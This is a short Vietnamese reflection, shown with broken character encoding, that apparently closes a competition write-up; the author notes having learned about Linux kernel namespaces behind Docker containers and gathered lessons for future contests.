Qua gi·∫£i n√†y m√¨nh ƒë√£ c√≥ c∆° h·ªôi ƒë∆∞·ª£c t√¨m hi·ªÉu v·ªÅ namespace, ~~th·ª© c√¥ng ngh·ªá~~ ch√≠nh l√† t√≠nh nƒÉng gi√∫p Linux kernel ph√¢n chia ra c√°c `container`, m√† ch√∫ng ta th∆∞·ªùng hay s·ª≠ d·ª•ng th√¥ng qua Docker. C≈©ng t·ª´ gi·∫£i n√†y m√¨nh r√∫t ra ƒë∆∞·ª£c v√†i kinh nghi·ªám 
ƒë·ªÉ cho nh·ªØng gi·∫£i l·∫ßn sau th·ªÉ hi·ªán t·ªët h∆°n.
